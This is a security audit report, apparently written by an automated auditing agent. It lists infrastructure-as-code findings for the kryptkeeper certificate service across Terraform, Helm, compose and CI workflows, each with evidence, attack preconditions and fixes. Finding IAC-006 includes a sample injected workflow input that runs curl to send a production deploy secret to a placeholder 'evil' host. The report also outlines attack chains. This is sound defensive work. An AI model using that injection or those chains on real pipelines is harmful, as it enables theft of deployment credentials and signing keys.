# IaC_FINDINGS 2026-10-09 (kryptkeeper, --deep audit, IaC phase)

## Task checklist (HANDOFF steps; ledger kept here because write-scope is docs/security/ only)

- [x] Detection gate: Terraform (deploy/terraform), Helm (charts/kryptkeeper, charts/kryptkeeper-certmanager-issuer), compose, 4 Dockerfiles, nginx.conf, CI runner Containerfile, 10 workflows. No raw K8s manifests under deploy/ (deploy/uat-lab is Windows unattend/PowerShell, deploy/ci-runner is a runner image plus launchd script).
- [x] Automated scan: Checkov, KICS and Trivy are **not installed** (`which` returned not found for all three). Per the HANDOFF nothing was installed. Every file in scope was reviewed by hand against the Checkov/KICS/Trivy rule families (CKV_AWS_*, CKV_K8S_*, CKV_DOCKER_*, CKV_GHA_*, KICS Terraform/K8s/Dockerfile/GHA queries). Terrascan and tfsec were not used.
- [x] IaC-01..IaC-10 manual checks, with IaC-05 (state) done by hand.
- [x] Cross-referenced CLOUD_FINDINGS, DEPENDENCY_FINDINGS (DEP-011), SECRETS_FINDINGS (SEC-04), OWASP_WEB_FINDINGS (OWASP-003) and OWASP_A02_A07 (A2A7-001). No duplicates were raised.
- [x] Findings written with preconditions/yields.

## Summary

| Status | Count |
|---|---|
| REAL | 17 (CRITICAL 0, HIGH 1, MEDIUM 7, LOW 9) |
| UNVERIFIED | 1 (IAC-U1) |

| ID | Sev | Title |
|---|---|---|
| IAC-001 | HIGH | Terraform Hub serves plain HTTP with bootstrap-token auth on a public Elastic IP |
| IAC-002 | MEDIUM | Bootstrap token and keystore passphrase in Terraform state; no backend configured |
| IAC-003 | MEDIUM | Keystore passphrase defaults to the bootstrap token (Terraform and compose) |
| IAC-004 | MEDIUM | Terraform deploys a mutable `latest` image with no digest or signature check |
| IAC-005 | MEDIUM | Helm chart: TLS on by default but probes, Service and ServiceMonitor speak HTTP |
| IAC-006 | MEDIUM | `workflow_dispatch` inputs are interpolated into `run:` (script injection into a prod-secret job) |
| IAC-007 | MEDIUM | `agent-build.yml` and `terraform-provider.yml` have no `permissions:` block; on the self-hosted forge the default token can write |
| IAC-008 | MEDIUM | CI job image is a third-party mutable tag (`catthehacker/ubuntu:act-latest`) |
| IAC-009 | LOW | Terraform `docker run` has none of the compose hardening; secrets passed as container env |
| IAC-010 | LOW | Network and logging gaps: open egress, no VPC flow logs, no RDS log exports, AWS-managed keys only |
| IAC-011 | LOW | DB TLS not verified (`sslmode=require`); compose postgres defaults to `changeme` / `sslmode=disable` |
| IAC-012 | LOW | Compose: hub and cleartext dashboard published on all host interfaces; dashboard nginx unhardened |
| IAC-013 | LOW | Base images pinned by tag, not digest; `placeholder` build mode can be published under a release tag |
| IAC-014 | LOW | Helm: no seccompProfile, SA token automounted, NetworkPolicy off by default with an empty peer and no egress |
| IAC-015 | LOW | certmanager-issuer chart: cluster-wide binding even with `watchNamespaces`; no digest option |
| IAC-016 | LOW | Over-broad workflow-level token permissions (`ci-main.yml`, `release.yml`) |
| IAC-017 | LOW | Long-lived COSIGN_KEY interpolated into a script and written to runner disk; no `persist-credentials: false` |

## How the keystore passphrase and DB DSN reach the container

| Path | Passphrase / bootstrap token | DB DSN | Exposure points |
|---|---|---|---|
| Terraform (EC2) | tfvars → `aws_secretsmanager_secret_version.app_secrets` (`compute/main.tf:76-82`, **plaintext in state**) → read at boot by user_data with the instance role (`user_data.sh.tpl:84-99`) | RDS-managed secret (`manage_master_user_password`, never in state) → user_data builds `DATABASE_URL=postgres://user:pw@host/db?sslmode=require` (`:108`) | Both are written to `/etc/kryptkeeper/kryptkeeper.env` (0600, root, `:106-112`) → systemd `EnvironmentFile` → `docker run -e` (`:127-140`). They are readable via `docker inspect` and `/proc/<pid>/environ` by root or the docker group (SSM sessions run as root). The password is not URL-encoded into the DSN. |
| Compose | `.env` → `KRYPTKEEPER_KEYSTORE_PASSPHRASE: ${…:-${APP_BOOTSTRAP_TOKEN}}` (`docker-compose.yml:25`) | `DATABASE_URL` / `KRYPTKEEPER_DB_DSN` from `.env` (`:30-31`); override example uses `sslmode=disable` | Container env (`docker inspect`). `.env` is excluded from the build context (`.dockerignore`). |
| Helm | `secrets.bootstrapToken` / `secrets.keystorePassphrase` → chart Secret `stringData` (`secret.yaml:10-11`), or `existingSecret`, or ESO `ExternalSecret` | `secrets.databaseURL` → same Secret (`secret.yaml:12-16`) | `envFrom: secretRef` (`deployment.yaml:44-48`). Inline values also persist in the Helm release Secret (`sh.helm.release.v1.*`) and in any committed values file. |

## Verified controls (checked, no finding)

- **RDS:** `publicly_accessible = false`, `storage_encrypted = true`, `manage_master_user_password = true` (no password in state), private subnets, SG ingress only from the app SG (`database/main.tf:26-35`, `networking/main.tf:137-144`), `deletion_protection` on by default. PG16 on RDS defaults `rds.force_ssl=1`.
- **EC2:** IMDSv2 required (`compute/main.tf:143-146`). The default hop limit of 1 also keeps the bridged container away from instance-role credentials. No SSH and no port 22; access is SSM only. Root and data EBS volumes are encrypted.
- **Ingress:** `allowed_app_ingress_cidr_blocks` has no default and a validation rule enforces at least one CIDR (`networking/variables.tf:36-48`). No 0.0.0.0/0 ingress is baked in.
- **IAM (IaC-03/07):** no wildcard actions or resources, no IAM users or access keys, no root-account resources. The two `GetSecretValue` grants are scoped to single ARNs. Missing KMS/ACM grants are already covered by **CLOUD-002** and are not re-raised.
- **Secrets not in user_data:** user_data contains only ARNs. Secrets are fetched at boot and kept out of argv.
- **Dockerfiles:** all four final stages are `distroless/static-debian12:nonroot` with `USER nonroot:nonroot`, CGO off, `-trimpath`. `.dockerignore` excludes `.env*`, `*.pem`, `*.key`, `.git`.
- **Compose hub service:** `read_only: true`, tmpfs `/tmp`, `cap_drop: [ALL]`, `no-new-privileges`. TLS is on by default via self-issue. `tls.key` stays in `appdata`, and only `ca.pem` is shared through `tls-trust`.
- **nginx upstream:** `proxy_ssl_verify on` with a pinned `proxy_ssl_name` and trusted CA (`nginx.conf:13-37`). Missing browser headers belong to **OWASP-003**.
- **Helm hub chart:** `runAsNonRoot`, UID 65534, `readOnlyRootFilesystem`, `allowPrivilegeEscalation: false`, drop ALL. Optional `image.digest` pin. `existingSecret` and ESO are supported, and `required` blocks empty secrets. Service is ClusterIP and ingress is off by default.
- **certmanager-issuer chart:** ClusterRole verbs are tight (`certificaterequests` get/list/watch, `/status` patch/update, events create/patch). The chart has `seccompProfile: RuntimeDefault` and the hub token comes from a `secretKeyRef`.
- **Workflows:** no `pull_request_target` and no `workflow_run`. `ci-pr.yml`, `openapi-validate.yml` and `nightly` are `contents: read`. `release.yml` uses keyless Sigstore signing. Promote and rollback jobs run under `environment:` gates. Action pinning by SHA is covered by **DEP-011** and is not re-raised.

---

## REAL findings

### IAC-001: Terraform Hub serves plain HTTP with bootstrap-token auth on a public Elastic IP
- id: IAC-001 | severity: HIGH | category: iac | tool: manual | status: REAL
- file: deploy/terraform/modules/compute/templates/user_data.sh.tpl:125
- evidence:
  - `:125` sets `AUTH_MODE=bootstrap APP_BIND_ADDR=0.0.0.0 PORT=8080 KRYPTKEEPER_DB_MODE=postgres …`. It sets no `APP_CERTIFICATE_PROVIDER`, no `KRYPTKEEPER_TLS_CERT_FILE/KEY_FILE` and no `KRYPTKEEPER_TLS_SELF_ISSUE`.
  - `cmd/kryptkeeper/main.go:85-86` evaluates `needsCrypto := certMode == "ca"`, so it is false. `resolveTLSMode` then takes its default branch (`cmd/kryptkeeper/tls.go:91-103`), returns a nil TLS config and logs "serving plain HTTP". `internal/bootstrap/server.go:185` then calls `srv.ListenAndServe()`.
  - `:128` publishes `-p 8080:8080`. The instance has `associate_public_ip_address = true` (`compute/main.tf:141`), sits in a public subnet with an EIP (`:178-185`), and the SG opens `app_port` to the operator CIDRs (`networking/main.tf:107-115`). No ALB or TLS terminator is provisioned.
  - Side effect: the module also never enables the CA engine, so the keystore passphrase it carefully provisions is unused. Operators who notice will add `APP_CERTIFICATE_PROVIDER=ca` by hand and get a self-signed listener with no trust distribution.
- preconditions:
  - "network position on any path between an operator/client and the Hub EIP (shared Wi-Fi, ISP, transit, corporate proxy) and an allowed source CIDR range in use"
- yields:
  - "APP_BOOTSTRAP_TOKEN (full admin) and session/API tokens in cleartext"
  - "ability to tamper with API responses (CSR submissions, issued certs, agent enrolment) in transit"
- asset: Hub admin credential; integrity of certificate issuance
- remediation: Set `APP_CERTIFICATE_PROVIDER=ca` in the unit `Environment=` and either set `KRYPTKEEPER_TLS_CERT_FILE/KEY_FILE` (an ACM-exportable or operator-supplied cert) or put an ALB with an ACM cert and HTTPS listener in front, moving the instance to a private subnet. At minimum, set `KRYPTKEEPER_TLS_SELF_ISSUE=true` with `KRYPTKEEPER_TLS_SANS` covering the EIP/DNS name and output the CA bundle.

### IAC-002: Bootstrap token and keystore passphrase in Terraform state; no backend configured
- id: IAC-002 | severity: MEDIUM | category: iac | tool: manual | status: REAL
- file: deploy/terraform/modules/compute/main.tf:76
- evidence:
  - `aws_secretsmanager_secret_version.app_secrets.secret_string = jsonencode({app_bootstrap_token, keystore_passphrase})` (`:76-82`). `sensitive = true` (`variables.tf:59,65`) only redacts CLI output. The value is stored in plaintext in state.
  - `versions.tf` and `providers.tf` have no `backend` block, so default use writes a local `terraform.tfstate`. The README says to use an encrypted remote backend (`README.md:78-86`), but nothing enforces it. `.gitignore` has no `*.tfstate`/`*.tfvars` pattern (already covered by **SEC-04**, not re-raised).
- preconditions:
  - "read access to the state file (operator laptop, CI artifact, mis-scoped S3 state bucket, or accidental commit)"
- yields:
  - "APP_BOOTSTRAP_TOKEN (Hub admin)"
  - "KRYPTKEEPER_KEYSTORE_PASSPHRASE (decrypts on-disk CA private keys given the data volume or a snapshot)"
- asset: Hub admin credential; CA private key at-rest protection
- remediation: Add a commented S3 backend (SSE-KMS, versioning, DynamoDB lock) to `versions.tf`. Create the secret value out-of-band (`aws secretsmanager put-secret-value`) or use a write-only argument (`secret_string_wo`; this needs Terraform >= 1.11 and a provider version that has it, so check before adopting) so the value never enters state. Add `*.tfstate*`, `*.tfvars`, `.terraform/` to `.gitignore`.

### IAC-003: Keystore passphrase defaults to the bootstrap token (Terraform and compose)
- id: IAC-003 | severity: MEDIUM | category: iac | tool: manual | status: REAL
- file: deploy/terraform/modules/compute/main.tf:80
- evidence:
  - `keystore_passphrase = coalesce(var.keystore_passphrase, var.app_bootstrap_token)` (`:80`). `variables.tf:63-66` documents this default.
  - `docker-compose.yml:25` sets `KRYPTKEEPER_KEYSTORE_PASSPHRASE: ${KRYPTKEEPER_KEYSTORE_PASSPHRASE:-${APP_BOOTSTRAP_TOKEN}}`.
  - The bootstrap token is a network credential. It is typed into browsers and scripts, sent on every bootstrap-auth request, and in IAC-001 sent in cleartext. The passphrase is the at-rest key for CA private keys. One leak compromises both.
- preconditions:
  - "APP_BOOTSTRAP_TOKEN obtained (IAC-001 sniffing, IAC-002 state, logs, shell history)"
  - "read access to the keystore directory, data volume, EBS snapshot or backup"
- yields:
  - "keystore decryption: CA private keys in plaintext, offline"
- asset: CA private keys
- remediation: Make the passphrase a required, separate variable in both paths (`${KRYPTKEEPER_KEYSTORE_PASSPHRASE:?…}` in compose, no `coalesce` in Terraform), or generate it with `random_password` and keep it out of state per IAC-002. This chains with **A2A7-001** (key escrow egress).

### IAC-004: Terraform deploys a mutable `latest` image with no digest or signature check
- id: IAC-004 | severity: MEDIUM | category: iac | tool: manual | status: REAL
- file: deploy/terraform/modules/compute/variables.tf:53
- evidence:
  - `image_tag` default is `"latest"` (`:50-54`). The root `variables.tf` passes it through. `user_data.sh.tpl:140` runs `'${image_repository}:${image_tag}'` with no `@sha256:` and no `cosign verify` before start, even though release images are signed (`release.yml`).
  - The AMI is selected with `most_recent = true` on the `al2023-ami-*` wildcard (`main.tf:6-24`), so a re-apply silently replaces the host OS image.
- preconditions:
  - "ability to push a tag to ghcr.io/bpmforge/kryptkeeper (compromised maintainer, a write-scoped CI token per IAC-016, or a registry compromise)"
  - "the Hub instance restarts or is replaced (image not cached)"
- yields:
  - "attacker code running as the Hub, with the keystore passphrase, bootstrap token and DB password in env"
- asset: Hub runtime; CA keys
- remediation: Make `image_tag` required, or add `image_digest` and run `repo@sha256:…`. Add `cosign verify --certificate-identity … --certificate-oidc-issuer https://token.actions.githubusercontent.com` in `ExecStartPre`. Pin the AMI ID through a variable.

### IAC-005: Helm chart: TLS on by default but probes, Service and ServiceMonitor speak HTTP
- id: IAC-005 | severity: MEDIUM | category: iac | tool: manual | status: REAL
- file: charts/kryptkeeper/values.yaml:130
- evidence:
  - `config.certificateProvider: ca` (`values.yaml:70`) becomes `APP_CERTIFICATE_PROVIDER=ca` (`configmap.yaml:10`). With no `KRYPTKEEPER_TLS_*` set, `resolveTLSMode` self-issues and the single main listener serves TLS (`tls.go:91-97`, `server.go:183`).
  - `livenessProbe` and `readinessProbe` are `httpGet` on 8080 with no `scheme: HTTPS` (`values.yaml:130-142`). The Go TLS server answers plain HTTP with 400, so the probes fail and the pod is never Ready and is restarted in a loop. The Service port is named `http` (`service.yaml:13`), the ServiceMonitor scrapes `port: http` with no TLS config (`servicemonitor.yaml:16`), and the Ingress has no backend-protocol annotation.
  - The chart has no `extraEnv` value. The only knob an operator can reach is adding `KRYPTKEEPER_TLS_DISABLE=true` to the Secret, which turns the in-cluster hop into cleartext.
- preconditions:
  - "chart installed with defaults; operator 'fixes' the crash loop by disabling TLS"
  - "attacker with pod-network visibility (compromised pod or node, no NetworkPolicy per IAC-014)"
- yields:
  - "bootstrap/admin and API tokens in cleartext inside the cluster"
- asset: Hub admin credential
- remediation: Set `scheme: HTTPS` on both probes. Name the port `https`, add `tlsConfig` (CA from the self-issue bundle) to the ServiceMonitor, and document the ingress backend-protocol annotation. Add `extraEnv` and a `tls.existingSecret` value for operator-supplied certs.

### IAC-006: `workflow_dispatch` inputs are interpolated into `run:` (script injection into a prod-secret job)
- id: IAC-006 | severity: MEDIUM | category: iac | tool: manual | status: REAL
- file: .github/workflows/promote-by-digest.yml:147
- evidence:
  - `${{ inputs.* }}` is expanded into the shell source before bash parses it, so single quotes do not protect it:
    - `promote-by-digest.yml:51,56-68,82,112,147,190-193`
    - `rollback-by-digest.yml:43-52,66,87,122,165-167`
    - `release-candidate.yml:111,130,217` (`:217` is unquoted)
  - The `deploy` job (`promote-by-digest.yml:124-147`, `rollback-by-digest.yml:99-122`) runs under `environment: ${{ inputs.target_env }}` with `DEPLOY_CMD_PRODUCTION` in env. The input is spliced in at `:147`, which is `scripts/deploy/by-digest.sh '…' '${{ inputs.image_digest }}' '${{ inputs.change_ticket }}'`. A `change_ticket` such as `x'; curl -d "$DEPLOY_CMD_PRODUCTION" https://evil #` runs once an approver approves what looks like a normal promotion.
- preconditions:
  - "repo write access (can dispatch workflows) but not an environment approver"
  - "approver does not inspect raw input strings"
- yields:
  - "code execution in the production deploy job; exfiltration of DEPLOY_CMD_PRODUCTION and other environment secrets"
- asset: production deploy credentials
- remediation: Pass every input through `env:` (`IMAGE_DIGEST: ${{ inputs.image_digest }}`) and reference `"$IMAGE_DIGEST"`. Validate the format with a regex in the first job before any later use. Apply the same fix to `secrets.*` interpolation (IAC-017).

### IAC-007: `agent-build.yml` and `terraform-provider.yml` have no `permissions:` block; on the self-hosted forge the default token can write
- id: IAC-007 | severity: MEDIUM | category: iac | tool: manual | status: REAL
- file: .github/workflows/agent-build.yml:3
- evidence:
  - Neither workflow has a top-level `permissions:`. Only the `release` jobs set `contents: write` (`agent-build.yml:112`, `terraform-provider.yml:104`). The `changes`, `build` and `test` jobs run on `push` and `pull_request` with the platform default token.
  - CI currently runs on a act_runner with these same files. the self-hosted forge's automatic token for same-repo events is repo-write capable, unlike GitHub's restricted default. These jobs also run mutable-tag third-party actions (**DEP-011**) and `go test ./...` over PR code.
- preconditions:
  - "compromised third-party action tag (DEP-011) or a same-repo PR branch with malicious test code"
- yields:
  - "repo-write token: push commits/tags, modify releases, publish packages"
- asset: source repository and release artifacts
- remediation: Add top-level `permissions: contents: read` to both workflows and grant `contents: write` only in `release`. Confirm the the self-hosted forge instance's default Actions token permission setting.

### IAC-008: CI job image is a third-party mutable tag (`catthehacker/ubuntu:act-latest`)
- id: IAC-008 | severity: MEDIUM | category: iac | tool: manual | status: REAL
- file: deploy/ci-runner/Containerfile:6
- evidence: `FROM docker.io/catthehacker/ubuntu:act-latest` is the base for every the self-hosted forge CI job, including the release-candidate job that writes `COSIGN_KEY` to disk (`release-candidate.yml:204`) and the jobs that hold GHCR-write tokens. The tag is mutable and the image is maintained by a third party. The runner runs on the developer workstation's podman VM (`run.sh:5-8`).
- preconditions:
  - "compromise of or malicious update to the catthehacker/ubuntu image, picked up on the next runner image rebuild"
- yields:
  - "code execution in every CI job, including access to COSIGN_KEY/COSIGN_PASSWORD and write tokens"
- asset: CI secrets; release signing key
- remediation: Pin `catthehacker/ubuntu@sha256:<digest>` and bump it deliberately, or build from a pinned `ubuntu@sha256` base with the tools you need.

### IAC-009: Terraform `docker run` has none of the compose hardening; secrets passed as container env
- id: IAC-009 | severity: LOW | category: iac | tool: manual | status: REAL
- file: deploy/terraform/modules/compute/templates/user_data.sh.tpl:127
- evidence: `docker run --rm --name kryptkeeper -p 8080:8080 -e … -v …` (`:127-140`) has no `--read-only`, `--tmpfs /tmp`, `--cap-drop ALL` or `--security-opt no-new-privileges`. All four are present in `docker-compose.yml:82-96`. The secrets are passed as `-e`, so they show in `docker inspect`. The image is distroless nonroot, so the remaining risk is limited.
- preconditions: ["code execution inside the Hub container (app RCE)"]
- yields: ["writable root fs and default capabilities to aid persistence or escape"]
- asset: Hub host
- remediation: Add the same four flags. Mount secrets as files (`-v /etc/kryptkeeper/secrets:/run/secrets:ro`) if the app supports `*_FILE` variables.

### IAC-010: Network and logging gaps: open egress, no VPC flow logs, no RDS log exports, AWS-managed keys only
- id: IAC-010 | severity: LOW | category: iac | tool: manual | status: REAL
- file: deploy/terraform/modules/networking/main.tf:117
- evidence:
  - `app_all` egress allows `ip_protocol = "-1"` to `0.0.0.0/0` (`:117-122`). This is a deliberate choice, documented at `:94-96`.
  - No `aws_flow_log` on the VPC (IaC-06).
  - `aws_db_instance` has no `enabled_cloudwatch_logs_exports`, `performance_insights_*` or `iam_database_authentication_enabled` (`database/main.tf:17-47`).
  - EBS, RDS and Secrets Manager use the AWS-managed keys (no `kms_key_id`), so key policy provides no second gate on `GetSecretValue`.
  - The Hub is directly internet-addressable rather than behind a load balancer (IAC-001).
- preconditions: ["post-compromise of the Hub instance"]
- yields: ["unrestricted exfiltration egress; little forensic trail"]
- asset: incident response capability
- remediation: Add a VPC flow log, `enabled_cloudwatch_logs_exports = ["postgresql"]`, and an optional `kms_key_id` CMK for the secret, EBS and RDS. Restrict egress to 443 and the DB SG where feasible.

### IAC-011: DB TLS not verified (`sslmode=require`); compose postgres defaults to `changeme` / `sslmode=disable`
- id: IAC-011 | severity: LOW | category: iac | tool: manual | status: REAL
- file: deploy/terraform/modules/compute/templates/user_data.sh.tpl:108
- evidence:
  - `?sslmode=require` encrypts the connection but does not verify the server certificate (`verify-full` plus the RDS CA bundle is needed for that). The RDS-generated password is also inserted into the URL without encoding.
  - `docker-compose.override.yml:25` has `POSTGRES_PASSWORD: ${POSTGRES_PASSWORD:-changeme}`, while the bootstrap token uses `:?` to require a value. The example DSN at `:10` uses `sslmode=disable`. The postgres port is not published, which limits exposure to the compose network.
- preconditions: ["MITM inside the VPC, or access to the compose network"]
- yields: ["DB credential / DB traffic interception; trivial DB login on compose stacks left at default"]
- asset: Hub database
- remediation: Use `sslmode=verify-full&sslrootcert=/rds-ca.pem` and URL-encode the password (`jq -rR @uri`). Use `${POSTGRES_PASSWORD:?set POSTGRES_PASSWORD}` in compose.

### IAC-012: Compose: hub and cleartext dashboard published on all host interfaces; dashboard nginx unhardened
- id: IAC-012 | severity: LOW | category: iac | tool: manual | status: REAL
- file: docker-compose.yml:120
- evidence: `dashboard` publishes `"3000:80"` and the hub publishes `"8080:8080"` (`:14-15`), both bound to 0.0.0.0. nginx listens on plain HTTP 80 (`nginx.conf:2`) and proxies `/api/` including login and bootstrap-token traffic, so the browser-to-nginx hop is cleartext even though nginx-to-hub is TLS. `nginx:alpine` is unpinned and runs with no `read_only`, `cap_drop` or `no-new-privileges`. Headers are covered by **OWASP-003**.
- preconditions: ["compose stack run on a host reachable from other machines; attacker on the LAN path"]
- yields: ["admin/bootstrap credentials in cleartext via the dashboard"]
- asset: Hub admin credential
- remediation: Bind to `127.0.0.1:3000:80` and `127.0.0.1:8080:8080` by default, add a TLS `listen 443 ssl` server or document a TLS reverse proxy, and apply the hub service's hardening flags to `dashboard`.

### IAC-013: Base images pinned by tag, not digest; `placeholder` build mode can be published under a release tag
- id: IAC-013 | severity: LOW | category: iac | tool: manual | status: REAL
- file: Dockerfile:21
- evidence:
  - `golang:1.26-alpine` (Dockerfile `:21`, Dockerfile.agent `:16`, .certmanager `:13`, .mcp `:13`) and `gcr.io/distroless/static-debian12:nonroot` (`:151`, `:33`, `:30`, `:30`) are pinned by tag only. Compose uses `node:24-alpine`, `nginx:alpine` and `postgres:16-alpine`.
  - `release-candidate.yml:15-28` offers `build_mode: placeholder`, which builds a cleartext stub (`Dockerfile:111-139`) and pushes it under the requested `release_version`.
- preconditions: ["upstream image tag compromise, or a dispatcher selecting placeholder"]
- yields: ["tampered build toolchain/runtime base; a non-functional image published under a real version tag"]
- asset: release artifacts
- remediation: Pin `FROM image@sha256:…` with Renovate/Dependabot digest updates. Restrict the placeholder mode to non-release tags (for example, suffix `-placeholder`).

### IAC-014: Helm: no seccompProfile, SA token automounted, NetworkPolicy off by default with an empty peer and no egress
- id: IAC-014 | severity: LOW | category: iac | tool: manual | status: REAL
- file: charts/kryptkeeper/values.yaml:19
- evidence:
  - `podSecurityContext` (`:19-22`) has no `seccompProfile: RuntimeDefault`. The certmanager chart has one at `:40`. The pod therefore fails Pod Security `restricted` admission.
  - Neither chart sets `automountServiceAccountToken: false`. The hub needs no API access unless `k8sDiscovery` is enabled.
  - `networkPolicy.enabled: false` (`:164-166`). When enabled with the default selector, `networkpolicy.yaml:24` renders `from: - {}`. Kubernetes either rejects an empty peer at validation or the result does not match the "in-namespace" intent in the comment (`values.yaml:160`). Verify on apply; `podSelector: {}` expresses in-namespace. There is no Egress policy.
  - Inline `secrets.*` values persist in the Helm release Secret.
- preconditions: ["compromised pod in the same cluster"]
- yields: ["unrestricted network reach to the Hub (combines with IAC-005 cleartext); a mounted SA token for API probing"]
- asset: Hub pod
- remediation: Add `seccompProfile: {type: RuntimeDefault}` and `automountServiceAccountToken: false` (true only when `k8sDiscovery.enabled`). Enable NetworkPolicy by default with `podSelector: {}` plus the ingress-controller namespace, and add an Egress allowlist (DNS, DB, 443).

### IAC-015: certmanager-issuer chart: cluster-wide binding even with `watchNamespaces`; no digest option
- id: IAC-015 | severity: LOW | category: iac | tool: manual | status: REAL
- file: charts/kryptkeeper-certmanager-issuer/templates/rbac.yaml:31
- evidence:
  - A `ClusterRoleBinding` is always rendered (`:31-44`), so the controller can read and patch `certificaterequests/status` in every namespace even when `watchNamespaces` limits what it serves (`values.yaml:26`).
  - The image is tag-only (`deployment.yaml:26`), with no `image.digest` option, unlike the hub chart.
- preconditions: ["issuer pod compromise"]
- yields: ["ability to write a forged certificate into any namespace's CertificateRequest status"]
- asset: cluster workload TLS identities
- remediation: When `watchNamespaces` is set, render a `Role`/`RoleBinding` per namespace. Add `image.digest`.

### IAC-016: Over-broad workflow-level token permissions (`ci-main.yml`, `release.yml`)
- id: IAC-016 | severity: LOW | category: iac | tool: manual | status: REAL
- file: .github/workflows/ci-main.yml:8
- evidence:
  - `ci-main.yml:8-10` grants `packages: write` to all 7 jobs, and no job logs in or pushes to a registry. Those jobs run `npm ci` and the UI build.
  - `release.yml:22-25` grants `contents/packages/id-token: write` to the `test` job (`:28-37`) as well as `goreleaser`.
  - GitHub Actions is currently disabled; on the self-hosted forge the scope maps to the self-hosted forge's package registry.
- preconditions: ["malicious npm/Go dependency or action executing in a non-publishing job"]
- yields: ["package-write token: overwrite a published image tag (feeds IAC-004 `latest`); a Sigstore OIDC identity to sign as the release workflow"]
- asset: published images and signatures
- remediation: Set the top level to `contents: read` and grant write scopes only on the publishing job.

### IAC-017: Long-lived COSIGN_KEY interpolated into a script and written to runner disk; no `persist-credentials: false`
- id: IAC-017 | severity: LOW | category: iac | tool: manual | status: REAL
- file: .github/workflows/release-candidate.yml:204
- evidence:
  - `printf '%s' '${{ secrets.COSIGN_KEY }}' > cosign.key`. The secret is spliced into the script source, so a `'` in the value breaks quoting. It is written to the self-hosted runner's workspace, and `rm` runs only on success.
  - Promote and rollback verify with `--key` while `release.yml` signs keyless. This is a documented known gap (fail-closed) and is not counted.
  - No `actions/checkout` sets `persist-credentials: false`.
- preconditions: ["shared/self-hosted runner workspace access or a failed job leaving cosign.key"]
- yields: ["release signing key"]
- asset: image signing trust
- remediation: Use `env: COSIGN_KEY: ${{ secrets.COSIGN_KEY }}` with `cosign sign --key env://COSIGN_KEY`, or move release-candidate to keyless signing and switch promote and rollback to `--certificate-identity`. Add `persist-credentials: false`.

---

## UNVERIFIED

### IAC-U1: act_runner may expose the podman socket to job containers
- id: IAC-U1 | severity: (MEDIUM if confirmed) | category: iac | tool: manual | status: UNVERIFIED
- file: deploy/ci-runner/run.sh:6
- evidence: `DOCKER_HOST` is the podman machine socket. The runner's `config.yaml` (`~/.config/ci-runner`) is not in the repo, so `container.docker_host`, `valid_volumes` and `privileged` cannot be checked. If the socket is mounted into jobs, any PR job controls the podman VM.
- remediation: Confirm `container.docker_host: "-"` (no socket mount), `privileged: false`, and an empty `valid_volumes`. Restrict fork PRs from running on this runner.

## Phase 3 correlation (Cloud and other specialists)

- **CLOUD-002** (no KMS/ACM grants in the hub role): the root cause is `compute/main.tf:38-101`. Not re-raised. IAC-001 adds that the module does not enable the CA engine either.
- **CLOUD-004** (static cloud tokens in env): IAC-009 and IAC-014 are the delivery path, through env vars and the Helm Secret.
- **DEP-011** (actions not SHA-pinned) raises the impact of IAC-007 and IAC-016.
- **SEC-04** (.gitignore) is the commit path for IAC-002.
- **OWASP-003** covers the nginx headers. IAC-012 covers only transport and exposure.
- **A2A7-001** (key escrow egress) plus IAC-003 means the network admin token can also decrypt the at-rest keystore.
- Chain hint for attack-chainer: IAC-001 (sniff bootstrap token) → IAC-003 (same value is the keystore passphrase) → CA keys in plaintext given the volume or a snapshot. Separately, IAC-016 (package write) → IAC-004 (`latest` pulled on restart) → code running with all Hub secrets.

## Appendix: tool output

Checkov, KICS and Trivy: not installed (`which checkov kics trivy` returned not found for all three). No JSON results were produced, and `docs/security/checkov-results.json` and `trivy-iac-results.json` intentionally do not exist. Recommended follow-up once a tool is available: `checkov -d deploy/terraform -d charts --framework terraform,helm,dockerfile,github_actions` and `trivy config .`.

# Completion Manifest

## Files produced
- `docs/security/IaC_FINDINGS_2026-10-09.md`: IaC findings (17 REAL, 1 UNVERIFIED), secret-delivery map, verified controls, correlations

## Files modified
- None

## Decisions made
- IAC-001 rated HIGH after confirming in code (`main.go:85-86`, `tls.go:91-103`, `server.go:185`) that the Terraform unit env leads to plain HTTP.
- Action SHA pinning, KMS grants, .gitignore and browser headers were left to DEP-011, CLOUD-002, SEC-04 and OWASP-003.

## Known issues / deferred
- No automated IaC scanner was run (none installed; installing was out of scope).
- The runner config is outside the repo (IAC-U1).

## Verify result
- PASS: every REAL finding cites a file:line that was read this session — evidence: `docs/security/IaC_FINDINGS_2026-10-09.md`

## Memory written
- None. Nothing durable beyond this report.
## Model tier: large (medium context)

Maker: iac-security-checker
Verifier: attack-chainer / security-auditor resume (pending)

## Ready for: attack-chainer

iac done
